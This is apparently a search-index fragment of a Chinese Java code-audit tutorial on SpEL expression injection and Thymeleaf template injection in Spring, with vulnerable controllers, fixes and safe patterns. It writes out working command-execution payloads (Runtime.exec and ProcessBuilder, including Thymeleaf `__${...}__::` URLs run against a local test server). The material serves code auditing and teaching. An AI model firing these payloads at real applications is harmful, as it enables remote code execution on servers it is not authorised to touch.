\u6bd4\u5982\u5728\u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\uff0cwelcome\u662ftemplatename\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9/templates/welcome.html \u7684selector\u6765\u6307\u5b9a\u9875\u9762\u663e\u793a\u4f55\u79cd\u5185\u5bb9 @GetMapping(\"/fragment\") public String fragment(@RequestParam String section) { return \"welcome :: \" + section; //fragment is tainted } <!DOCTYPE HTML> <html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"> <div th:fragment=\"header\"> //\u5982\u679cselector \u662fheader\uff0c\u90a3\u4e48\u53ea\u663e\u793a\u8be5div\u4e2d\u7684\u5185\u5bb9 <h3>Spring Boot Web Thymeleaf Example</h3> </div> <div th:fragment=\"main\"> ////\u5982\u679cselector \u662fmain\uff0c\u90a3\u4e48\u53ea\u663e\u793a\u8be5div\u4e2d\u7684\u5185\u5bb9 <span th:text=\"'Hello, ' + ${message}\"></span> </div> </html> \u8fd8\u6709\u4e0b\u56fe\u8fd9\u79cd\u795e\u5947\u4ee3\u7801 @GetMapping(\"/doc/{document}\") public void getDocument(@PathVariable String document) { log.info(\"Retrieving \" + document); //returns void, so view name is taken from URI } \u4ee3\u7801\u5e76\u6ca1\u6709\u8fd4\u56de\u89c6\u56fe\uff0c\u4f46\u662f\u6ce8\u610f\u8def\u7531\u4e2d\u7684{document}\uff0c\u8fd9\u91cc\u4f1a\u76f4\u63a5\u628a/doc/{document}\u7528\u4f5c\u89c6\u56fe\u540d\u8fd4\u56de Thymeleaf \u6a21\u677f\u6ce8\u5165 \u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u8868\u8fbe\u5f0f\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b9e\u73b0Spel\u8868\u8fbe\u5f0f\u6ce8\u5165\u4e86 \u6839\u636e\u4e0a\u4e00\u5c0f\u8282\u7684\u77e5\u8bc6\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u8f7b\u677e\u7684\u6784\u9020\u4e0b\u9762\u8fd9\u4e32\u4ee3\u7801\u7684payload\uff0c\u901a\u8fc7\u62a5\u9519\u628a\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u5e26\u51fa\u6765 @GetMapping(\"/path\") public String path(@RequestParam String lang) { return \"user/\" + lang + \"/welcome\"; //template path is tainted } payload:__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()).next()}__:: \u90a3\u4e48\u8fd9\u4e32\u4ee3\u7801\u5462\uff1f\u6211\u4eec\u53ea\u6709selector\u53ef\u63a7 @GetMapping(\"/fragment\") public String fragment(@RequestParam String section) { return \"welcome :: \" + section; //fragment is tainted } \u5b9e\u6218\u4e2d\u53ef\u4ee5\u53d1\u73b0\u662f\u65e0\u6cd5\u76f4\u63a5\u5f97\u5230\u56de\u663e\u7684\uff08\u56e0\u4e3a\u4e0d\u62a5\u9519\uff09\uff0c\u4f46\u662f\u547d\u4ee4\u4f9d\u65e7\u4f1a\u88ab\u89e3\u6790\u6267\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7dns\u5916\u5e26\u7b49\u65b9\u5f0f\u5e26\u51fa\u7ed3\u679c \u4f1a\u53d1\u73b0\u7b2c\u4e09\u884c\u548c\u5012\u6570\u7b2c\u4e09\u884c\u90fd\u7528\u5230\u4e86th: \u8fd9\u4e2a\u524d\u7f00\uff0c\u8fd9\u4e2a\u524d\u7f00\u5c31\u662f\u4f7f\u7528Thymeleaf\u7684\u6807\u5fd7\uff0c\u7528\u4e8e\u8c03\u7528Thymeleaf\u5185\u90e8\u7684\u65b9\u6cd5\u3002","title":"Spel\u8868\u8fbe\u5f0f\u6ce8\u5165&\u76f8\u5173\u7ec4\u4ef6\u7684Spel\u8868\u8fbe\u5f0f\u6ce8\u5165\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#spelspel","text":"","title":"Spel\u8868\u8fbe\u5f0f\u6ce8\u5165&amp;\u76f8\u5173\u7ec4\u4ef6\u7684Spel\u8868\u8fbe\u5f0f\u6ce8\u5165\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#_1","text":"Spel\u8868\u8fbe\u5f0f\u6ce8\u5165 \u73af\u5883\u642d\u5efa \u6f0f\u6d1e\u539f\u7406 \u5ba1\u8ba1\u5173\u952e\u5b57 \u4fee\u590d Thymeleadf \u6a21\u677f\u6ce8\u5165\uff08\u57fa\u4e8eSpel\u8868\u8fbe\u5f0f\u6ce8\u5165\uff09 \u7b80\u4ecb Thymeleaf\u8fd0\u884c\u903b\u8f91 redirect: HttpServletResponse \u9632\u5fa1 ResponseBody RestController Thymeleaf \u6a21\u677f\u6ce8\u5165","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#spel","text":"Spel\u8868\u8fbe\u5f0f\u662fspring\u4e0b\u7684\u4e00\u79cd\u8868\u8fbe\u5f0f\u8bed\u8a00\uff0c\u82e5\u76ee\u6807\u7a0b\u5e8fSpel\u8868\u8fbe\u5f0f\u53ef\u63a7\u4e14\u80fd\u88ab\u89e3\u6790\uff0c\u5219\u53ef\u80fd\u4f1a\u5bfc\u81f4RCE\u7b49\u5b89\u5168\u95ee\u9898\u3002","title":"Spel\u8868\u8fbe\u5f0f\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#_2","text":"\u8d77\u4e00\u4e2a\u9879\u76ee\uff0c\u7136\u540e\u5bfc\u5165maven\u5373\u53ef <properties> <org.springframework.version>5.0.8.RELEASE</org.springframework.version> </properties> <dependency> <groupId>org.springframework</groupId> <artifactId>spring-expression</artifactId> <version>${org.springframework.version}</version> </dependency>","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#_3","text":"\u6211\u4eec\u6765\u770b\u4e00\u6bb5\u6709\u6f0f\u6d1e\u7684\u4ee3\u7801\uff0c\u5047\u8bbeexpression2 \u53d8\u91cf\u7528\u6237\u53ef\u63a7 ExpressionParser parser = new SpelExpressionParser(); String expression2 = \"T(java.lang.Runtime).getRuntime().exec('calc')\"; //\u5047\u8bbeexpression2 \u53d8\u91cf\u7528\u6237\u53ef\u63a7\uff0c\u8fd9\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9\u4fbf\u662fspel\u8868\u8fbe\u5f0f //\u4e5f\u53ef\u4ee5\u7528new\u5173\u952e\u5b57 String expression2 = \"new ProcessBuilder('calc').start()\"; Expression result2 = parser.parseExpression(expression2); result2.getValue(); \u7528\u6237\u4f20\u5165\u6076\u610fspel\u8868\u8fbe\u5f0f\u540e\uff0c\u5728\u7b2c\u4e09\u884cparseExpression\u65b9\u6cd5\u88ab\u89e3\u6790\uff0c\u7b2c\u56db\u884c\u5728getValue\u65b9\u6cd5\u88ab\u6267\u884cspel\u8868\u8fbe\u5f0f\u5185\u5bb9\uff0c\u5b8c\u6210RCE \u7528\u6237\u4f20\u5165\u7684Spel\u8868\u8fbe\u5f0f\u4e2d\uff0c T(java.lang.Runtime)\u7528\u4e8e\u5b9e\u4f8b\u5316\u67d0\u4e2a\u7c7b\uff0c\u5b9e\u4f8b\u5316\u540e\u6211\u4eec\u53ef\u4ee5\u8c03\u7528\u5176\u5185\u90e8\u65b9\u6cd5\u3002\u4e5f\u53ef\u4ee5\u7528new\u5173\u952e\u5b57\uff0c\u5c31\u50cf\u6ce8\u91ca\u4e2d\u7684\u4e00\u884c \u6709\u4e9b\u65f6\u5019\u4f1a\u5bf9spel\u8fdb\u884c\u9274\u522b\uff0c\u5373\u6ee1\u8db3\u4e00\u5b9a\u6761\u4ef6\u7684\u5b57\u7b26\u4e32\u624d\u4f1a\u88ab\u8ba4\u4e3a\u662f\u8868\u8fbe\u5f0f\uff0c\u6bd4\u5982\u8fd9\u6837 ExpressionParser parser = new SpelExpressionParser(); ParserContext parserContext = new ParserContext() { @Override public boolean isTemplate() { return true; } @Override public String getExpressionPrefix() { return \"#{\"; } @Override public String getExpressionSuffix() { return \"}\"; } }; String template = \"#{'hello '}#{'freebuf!'}\"; Expression expression = parser.parseExpression(template, parserContext); System.out.println(expression.getValue()); \u901a\u8fc7getExpressionPrefix\u548cgetExpressionPrefix\u65b9\u6cd5\uff0c\u786e\u5b9a\u5728 #{..} \u4e2d\u7684\u5b57\u7b26\u4e32\u624d\u4e3aSPEL\u8868\u8fbe\u5f0f","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#_4","text":"org.springframework.expression.spel.standard getValue() parseExpression()","title":"\u5ba1\u8ba1\u5173\u952e\u5b57"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#_5","text":"SimpleEvaluationContext\u2009\u548cStandardEvaluationContext\u2009 StandardEvaluationContext\u2009 \u662f\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587\u73af\u5883\uff0c\u5bf9spel\u89e3\u6790\u4e0d\u8bbe\u9650\u5236 SimpleEvaluationContext\u2009 \u662f\u53d7\u9650\u7684\u4e0a\u4e0b\u6587\u73af\u5883\uff0c\u4e0d\u5141\u8bb8spel\u6267\u884c\u6784\u9020\u65b9\u6cd5\uff0cjava\u7c7b\u578b\u5f15\u7528\uff0cbean\u7c7b\u578b\u5f15\u7528 \u4fee\u590d\u540e\u4ee3\u7801 ExpressionParser parser = new SpelExpressionParser(); String expression2 = \"new ProcessBuilder('calc').start()\"; Expression result2 = parser.parseExpression(expression2); EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build(); result2.getValue(context); \u8fd0\u884c\u7ed3\u679c ref: https://www.freebuf.com/articles/network/250026.html \u4f7f\u7528\u5982\u4e0b\u9879\u76ee\u642d\u5efa\u73af\u5883\uff0cidea\u6253\u5f00\u5176pom.xml\u5373\u53ef https://github.com/veracode-research/spring-view-manipulation/","title":"\u4fee\u590d"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#thymeleadf-spel","text":"","title":"Thymeleadf \u6a21\u677f\u6ce8\u5165\uff08\u57fa\u4e8eSpel\u8868\u8fbe\u5f0f\u6ce8\u5165\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#_6","text":"Thymeleaf\u662f\u4e00\u4e2a\u670d\u52a1\u7aef\u6a21\u677f\u5f15\u64ce\uff0cspring\u5b98\u65b9\u652f\u6301\u8be5\u5f15\u64ce\u3002","title":"\u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#thymeleaf","text":"\u6765\u5230\u9879\u76ee\u4e2d\u7684HelloControleer \u7b2c16\u884c @GetMapping(\"/\") public String index(Model model) { model.addAttribute(\"message\", \"happy birthday\"); return \"welcome\"; } \u8fd9\u91cc\u4ee3\u7801\u903b\u8f91\u662fspring\u7684\uff0c\u63a5\u6536\u6240\u6709url\u4e3a / \u7684\u8bf7\u6c42\u5230\u6b64\u63a7\u5236\u5668\u8fdb\u884c\u5904\u7406\u3002 \u7136\u540e\u5411model\u6dfb\u52a0\u952e\u503c\u5bf9\uff0cmodel\u4e2d\u7684\u6570\u636e\u4f1a\u968f\u7740\u8981\u8fd4\u56de\u7684\u89c6\u56fe\u4e00\u8d77\u8fd4\u56de\u7ed9\u524d\u7aef\uff0c\u6b64\u5904\u952e\u4e3amessage\uff0c\u503c\u4e3ahappy birthday \u7136\u540ereturn\u4e00\u884c\u8fd4\u56de\u4e86 /templates/welcome.html \u8fd9\u4e2a\u89c6\u56fe \uff08\u76f8\u5f53\u4e8e\u7ed9welcome\u6dfb\u52a0\u524d\u7f00templates/ \uff0c\u540e\u7f00.html) \u6211\u4eec\u6765\u770b\u770bwelcome.html <!DOCTYPE HTML> <html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"> <div th:fragment=\"header\"> <h3>Spring Boot Web Thymeleaf Example</h3> </div> <div th:fragment=\"main\"> <span th:text=\"'Hello, ' + ${message}\"></span> </div> </html> \u6211\u4eec\u770b\u5012\u6570\u7b2c\u4e09\u884cth:text \u5185\u90e8\u6709 ${message} ,${...}\u91cc\u9762\u5c31\u662fSPEL\u8868\u8fbe\u5f0f\u6216\u8005ognl\u8868\u8fbe\u5f0f \u53e6\u5916\uff0c\u5982\u679c\u8fd4\u56de\u6a21\u677f\u65f6return\u7684\u5185\u5bb9\u4e2d\u542b\u6709 :: \uff0c\u5219\u8be5\u5b57\u7b26\u4e32\u4f1a\u88ab\u5f53\u4f5c\u8868\u8fbe\u5f0f\u5904\u7406 \u540c\u65f6\u5728\u8868\u8fbe\u5f0f\u4e2d\u8fd8\u6709 \\${..} \u8fd9\u79cd\u9884\u5904\u7406\u8868\u8fbe\u5f0f\uff0c\u5728\u5176\u4e2d\u7684\u5185\u5bb9\u4f1a\u66f4\u4f18\u5148\u5904\u7406\u4e00\u6b21\uff08\u9884\u5904\u7406\uff09 \u5c31\u50cf\u8fd9\u79cd\u4ee3\u7801 @GetMapping(\"/path\") public String path(@RequestParam String lang) { return \"user/\" + lang + \"/welcome\"; //template path is tainted } \u6ce8\u610f\u8fd9\u91cc\u7684payload\u6211\u5e76\u6ca1\u6709\u7528\u5230\u9884\u5904\u7406\u8868\u8fbe\u5f0f\uff0c\u56e0\u4e3asection\u4e2d\u53c2\u6570\u672c\u6765\u5c31\u662fselector\u7684\u5185\u5bb9\uff0c\u672c\u6765\u5c31\u4f1a\u88ab\u89e3\u6790\uff0c\u6ca1\u5fc5\u8981\u518d\u5957\u4e00\u5c42\u9884\u5904\u7406\u3002 \u6ce8\u610f\u8fd9\u91cc\u7684payload\u4e5f\u8981\u52a0\u4e0a\\${..} \u90a3\u4e48\u8fd9\u4e32\u4ee3\u7801\u5462\uff1f @GetMapping(\"/doc/{document}\") public void getDocument(@PathVariable String document) { log.info(\"Retrieving \" + document); //returns void, so view name is taken from URI } \u548c\u4e0a\u9762\u7684\u601d\u8def\u4e00\u6837\uff0c\u4f46\u662fpayload\u9700\u8981\u5fae\u5fae\u8c03\u6574\u4e00\u4e0b http://127.0.0.1:8090/doc/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"calc\").getInputStream()).next()}__::.x \u81f3\u4e8e\u4e3a\u4ec0\u4e48templatename\u5fc5\u987b\u88ab__${} \u5305\u56f4\uff0c\u662f\u56e0\u4e3a\u5b9e\u9645\u4e0a\u7684templatename\u4e3a/doc/xxxxxx \u6211\u4eec\u53ef\u63a7\u7684\u662f\u7b2c\u4e8c\u5c42\u8def\u7531\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u7b2c\u4e8c\u5c42\u8def\u7531\u91cc\u7684\u8868\u8fbe\u5f0f\u80fd\u591f\u987a\u5229\u88ab\u6267\u884c\u800c\u4e0d\u53d7\u524d\u9762\u7684 /doc/ \u5e72\u6270\u547d\u4ee4\uff0c\u6240\u4ee5\u7528 ${}__\u9884\u5904\u7406\u4e00\u4e0b \u81f3\u4e8e\u4e3a\u4ec0\u4e48selecor\u524d\u9762\u8981\u6709\u4e00\u4e2a . \u539f\u56e0\u662f\u8fd9\u6837\u7684 \u6a21\u677f\u540d\u83b7\u53d6\u5b9e\u9645\u4e0a\u662f\u901a\u8fc7\u8fd9\u4e2a\u51fd\u6570\u62ff\u5230\u7684 \u5b83\u4f1a\u5bf9url\u83b7\u5f97\u7684\u6a21\u677f\u540d\u8fdb\u884c\u4fee\u6b63\uff0c\u6bd4\u5982\u589e\u52a0\u524d\u7f00\u540e\u7f00\uff08\u9ed8\u8ba4\u4e3a\u7a7a\uff09\uff0c\u4ee5\u53ca\u8c03\u7528\u65b9\u6cd5transformPath\u5904\u7406 \u6211\u4eec\u8ddf\u8fdb\u6b64\u65b9\u6cd5\u5e76\u6ce8\u610f\u65ad\u70b9\u6253\u5230\u7684\u5730\u65b9 this.stripExtension\u5728\u8fd9\u79cd\u60c5\u51b5\u9ed8\u8ba4\u4e3atrue\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f1a\u8c03\u7528StringUtils.stripFilenameExtension\u6765\u5904\u7406\u6211\u4eec\u7684\u6a21\u677f\u540d StringUtils.stripFilenameExtension \u4f1a\u641c\u7d22\u5b57\u7b26\u4e32\u4e2d\u6700\u540e\u4e00\u4e2a . \u7b26\u53f7\u7684\u7d22\u5f15\u4f4d\u7f6e\uff0c\u5e76\u622a\u53d6 . \u4e4b\u524d\u7684\u5185\u5bb9\u8fd4\u56de\u3002 \u6240\u4ee5\u5982\u679c\u6211\u4eec\u7684payload selector\u4e0d\u52a0 . \u90a3\u4e48\u622a\u53d6\u540e\u7684\u8868\u8fbe\u5f0f\u4f1a\u53d8\u6210\u8fd9\u6837\uff0c\u6ca1\u6709\u4e86 :: \uff0c\u65e0\u6cd5\u6b63\u786e\u88ab\u5f53\u4f5c\u8868\u8fbe\u5f0f\u89e3\u6790 \u4f46\u5982\u679c\u52a0\u4e86 . ,\u90a3\u4e48\u88ab\u622a\u53d6\u540e\u8868\u8fbe\u5f0f\u4f1a\u53d8\u6210\u8fd9\u6837\uff0c :: \u8fd8\u5728\uff0c\u80fd\u88ab\u5f53\u4f5c\u8868\u8fbe\u5f0f\u89e3\u6790 \u5f04\u61c2\u539f\u7406\u540e\u5c31\u4f1a\u53d1\u73b0\u8fd9\u6837\u6784\u9020payload\u4e5f\u53ef\u4ee5 http://127.0.0.1:8090/doc/::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"calc\").getInputStream()).next()}__.a \u53ea\u8981\u914d\u7f6e\u4e0aResponseBody\u6216RestController\uff0c\u90a3\u4e48\u5c31\u4e0d\u4f1a\u8fdb\u884c\u89c6\u56fe\u89e3\u6790\u76f8\u5173\u5185\u5bb9\uff0c\u800c\u662f\u76f4\u63a5\u8fd4\u56de","title":"Thymeleaf\u8fd0\u884c\u903b\u8f91"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#redirect","text":"@GetMapping(\"/safe/redirect\") public String redirect(@RequestParam String url) { return \"redirect:\" + url; //FP as redirects are not resolved as expressions } \u5728\u8fd4\u56de\u503c\u524d\u52a0\u5b57\u7b26\u4e32redirect: \uff0c\u8868\u793a\u8be5\u89c6\u56fe\u7684\u89e3\u6790\u4e0d\u518d\u7531 Spring ThymeleafView\u6765\u8fdb\u884c\u89e3\u6790\uff0c\u800c\u662f\u7531 RedirectView \u6765\u8fdb\u884c\u89e3\u6790","title":"redirect:"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#httpservletresponse","text":"@GetMapping(\"/safe/doc/{document}\") public void getDocument(@PathVariable String document, HttpServletResponse response) { log.info(\"Retrieving \" + 